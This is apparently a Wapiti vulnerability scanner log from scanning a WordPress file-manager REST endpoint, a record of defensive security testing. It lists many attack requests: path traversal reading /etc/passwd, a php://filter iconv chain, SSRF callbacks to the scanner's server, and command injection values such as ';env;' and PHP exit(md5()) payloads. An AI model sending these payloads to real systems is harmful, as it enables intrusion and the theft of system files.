+2024-03-21 15:28:02.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-21 15:28:03.082 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-21 15:28:03.928 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 15:28:04.736 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 15:28:05.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 15:28:06.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 15:28:07.124 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 15:28:07.946 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 15:28:08.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 15:28:09.525 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 15:28:10.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:11.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:11.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:12.670 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:13.475 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-21 15:28:14.261 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 15:28:15.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 15:28:15.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 15:28:16.691 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 15:28:17.491 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 15:28:18.289 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 15:28:19.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 15:28:19.869 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 15:28:20.664 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:21.456 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:22.247 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:23.038 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:23.829 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 15:28:24.619 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-21 15:28:25.419 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 15:28:26.222 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-21 15:28:27.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 15:28:27.818 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-21 15:28:28.611 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 15:28:29.419 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-21 15:28:30.252 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:31.059 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:31.864 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:32.665 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:33.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-21 15:28:34.275 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-21 15:28:35.118 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-21 15:28:35.906 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-21 15:28:36.698 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-21 15:28:37.488 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-21 15:28:38.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-21 15:28:39.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-21 15:28:39.858 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=index.php
+2024-03-21 15:28:40.647 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=index.php%00
+2024-03-21 15:28:41.434 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=index.php%3A%3A%24DATA
+2024-03-21 15:28:42.251 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-21 15:28:42.259 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-21 15:28:42.280 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:42.281 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/index.php?rest_route=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Frq6fab%2F1%2F726573745f726f757465%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:43.027 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Frq6fab%2F1%2F66696c656e616d65%2F&fileid=45
+2024-03-21 15:28:43.827 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Frq6fab%2F1%2F66696c656964%2F
+2024-03-21 15:28:44.640 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=rq6fab for results, please wait...
+2024-03-21 15:28:46.920 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-21 15:28:46.968 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-21 15:28:46.986 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:46.990 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%3Benv%3B (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:47.771 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%7Cenv%7C (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:48.517 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%3Benv%3B (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:49.268 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%3Benv%3B (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:50.009 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:50.754 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%3Benv%3B (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:51.557 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%0Aenv%3B (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:52.303 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%26set%26 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:53.073 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=set (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:53.838 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=env (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:54.596 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%2Fe%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:55.363 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:56.130 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:28:56.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/index.php?rest_route=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+	data: filename=fuzz&fileid=45
